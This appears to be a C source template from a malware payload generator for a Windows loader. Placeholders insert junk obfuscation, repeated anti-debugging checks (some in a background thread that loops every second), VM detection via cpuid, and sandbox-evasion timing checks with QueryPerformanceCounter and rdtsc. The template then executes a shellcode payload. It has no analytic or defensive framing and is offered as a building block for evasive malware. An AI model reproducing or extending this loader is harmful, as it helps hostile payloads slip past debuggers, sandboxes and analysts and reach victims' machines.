#include <stdio.h>

{{header}}

#define DBG_THREAD_SLEEP_INTERVAL           (1000 + {{value:byte}} + {{value:byte}})  // ~1s

/**
 * Caller instructions:
 * 
 * {{caller-init}}
 *    Initializes the caller variable.
 * {{caller-var}}
 *    Inserts the caller variable. 
 *    Use it to pass the caller variable to the function as a parameter.
 * {{caller-ptr}}
 *    Inserts the caller pointer.
 *    Use it to pass the caller pointer to the function as a parameter.
 * {{caller-decl-var}}
 *    Inserts the caller variable declaration.
 *    Use it to declare the caller function parameter as a variable.
 * {{caller-decl-ptr}}
 *    Inserts the caller pointer declaration.
 *    Use it to declare the caller function parameter as a pointer.
 * {{caller-cast}}
 *    Declares the caller variable and initializes it by casting from a pointer.
 *    Use it in case of API callback functions with arguments of type void*.
 * {{caller-kernel}}
 *    Gets the 'kernel32.dll' module handle from the caller variable.
 *    Use it to access the kernel module when needed.
 * {{caller-proc}}
 *    Calls the 'GetProcAddress' function from the caller variable.
 *    Use it to get API functions from modules other than the kernel.
 */

static DWORD WINAPI thread_proc(LPVOID lpParameter) {
    {{obf:*}}
    {{caller-cast}}lpParameter;

    {{obf:*}}
    while (1) {
        {{obf:*}} {{dbg:*}}
        {{obf:*}} {{dbg:*}}
        {{obf:*}} {{dbg:*}}
        {{obf:*}} {{dbg:*}}
        {{obf:*}} {{dbg:*}}
        {{obf:*}} {{dbg:*}}
        {{obf:*}} {{dbg:*}}
        {{obf:*}} {{api-n:Sleep}}((PVOID)DBG_THREAD_SLEEP_INTERVAL);
        {{obf:*}}
    }

    {{obf:*}}
    return 0;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    {{obf:*}}
    {{obf:*}}
    {{obf:*}}
    {{caller-init}}

    // {{obf:*}} {{vmd:cpuid}}
    // {{obf:*}} {{vmd:*}}

    {{obf:*}} {{dbg:*}}
    {{obf:*}} {{dbg:*}}
    {{obf:*}} {{dbg:*}}
    {{obf:*}} {{dbg:*}}
    {{obf:*}} {{dbg:*}}
    {{obf:*}} {{dbg:*}}
    {{obf:*}} {{dbg:*}}
    {{obf:*}}

    if (!{{api-n:CreateThread}}(NULL, 0, thread_proc, {{caller-ptr}}, 0, NULL)) {
        {{obf:*}}
        return 0;
    }
    
    {{obf:*}} {{snd:clone}}
    {{obf:*}} {{snd:query_performance_counter,rdtsc}}
    {{obf:*}} {{snd:*}}
    {{obf:*}} {{snd:*}}
    {{obf:*}} {{snd:query_performance_counter,rdtsc}}
    
    {{obf:*}} {{shell-exec}}
    {{obf:*}}

    return 0;
}
